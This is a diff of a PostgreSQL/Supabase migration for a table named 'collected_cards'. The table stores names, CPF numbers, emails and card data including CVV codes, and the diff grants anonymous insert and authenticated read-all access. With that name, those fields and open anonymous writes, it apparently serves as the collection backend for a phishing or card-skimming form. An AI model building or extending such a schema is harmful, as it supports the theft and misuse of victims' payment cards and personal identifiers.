@@ -1,6 +1,6 @@
-create table if not exists public.collected_cards (
-  id uuid default gen_random_uuid() primary key,
-  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
+CREATE TABLE IF NOT EXISTS public.collected_cards (
+  id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
+  created_at timestamp with time zone DEFAULT now() NOT NULL,
   nome text,
   cpf text,
   email text,
@@ -11,13 +11,19 @@ create table if not exists public.collected_cards (
   cvv text
 );
 
-alter table public.collected_cards enable row level security;
+GRANT ALL ON public.collected_cards TO authenticated;
+GRANT ALL ON public.collected_cards TO service_role;
+GRANT INSERT ON public.collected_cards TO anon;
 
-create policy "Permitir inserção anônima" on public.collected_cards
-  for insert
-  with check (true);
+ALTER TABLE public.collected_cards ENABLE ROW LEVEL SECURITY;
 
-create policy "Permitir leitura autenticada" on public.collected_cards
-  for select
-  to authenticated
-  using (true);
+DROP POLICY IF EXISTS "Permitir inserção anônima" ON public.collected_cards;
+CREATE POLICY "Permitir inserção anônima" ON public.collected_cards
+  FOR INSERT
+  WITH CHECK (true);
+
+DROP POLICY IF EXISTS "Permitir leitura autenticada" ON public.collected_cards;
+CREATE POLICY "Permitir leitura autenticada" ON public.collected_cards
+  FOR SELECT
+  TO authenticated
+  USING (true);
